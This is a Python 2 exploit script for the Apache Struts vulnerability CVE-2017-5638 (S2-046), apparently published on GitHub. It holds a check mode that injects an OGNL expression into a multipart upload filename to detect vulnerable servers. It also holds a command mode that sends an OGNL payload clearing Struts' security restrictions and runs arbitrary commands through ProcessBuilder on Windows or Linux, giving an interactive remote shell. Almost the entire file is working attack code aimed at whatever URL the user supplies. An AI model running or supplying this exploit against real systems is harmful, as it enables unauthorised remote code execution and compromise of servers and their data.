#coding=utf-8

import requests
import sys
import warnings
import argparse

'''wanger@github'''
'''Another Attack Vector for CVE-2017-5638'''

warnings.filterwarnings("ignore")

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",}

somedata = "nothing"

def check(url):
    files = {"file":("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('bingo','wellunluckyguy')}\00b",somedata,"text/plain")}
    try:
        res = requests.post(url,files = files,headers = headers,verify = False,timeout = 8)
        if res.status_code == 200:
            if res.headers["bingo"].strip() == "wellunluckyguy":
                print url
                print "Yes,It's an unlucky guy with s2-046!"
    except Exception,e:
        print "Maybe It's a lucky guy!"
        
def command(cmdstr,url):
    payload = "%{(#vlu='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmdstr
    
    payload += "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\00b"
    
    files = {"file":(payload,somedata,"text/plain"),
    }
    try:
        res = requests.post(url,headers = headers,files = files,verify = False,timeout = 8)
        if res.status_code == 200:
            print res.content
        else:
            print "RCE Failed!\n"
            exit()
    except Exception,e:
        print e
        print "RCE Failed!\n"
        exit()

def main():
    parser = argparse.ArgumentParser(prog='s2-046_cmd.py',description='CVE-2017-5638 | Apache Struts S2-046')
    parser.add_argument('--cmd', dest='CMD', action='store_true', help='drop into shell-like RCE,enter \q to exit')
    parser.add_argument('--check', dest='CHECK', action='store_true', help='check the target')
    parser.add_argument('--url', dest='URL', help='specifiy the url of the target')
    args = parser.parse_args()
    
    if args.CMD and args.URL:
        loop = 1
        while loop == 1:
            cmdstr = raw_input('# ')
            while cmdstr.strip() == '':
                cmdstr = raw_input('# ')
            if cmdstr.strip() == '\q':
                print 'Bye!'
                exit()
            command(cmdstr,args.URL)
    
    elif args.CHECK and args.URL:
        check(args.URL)
    
    else:
        print parser.print_help()
    
if __name__ == "__main__":
    main()                         
    
    
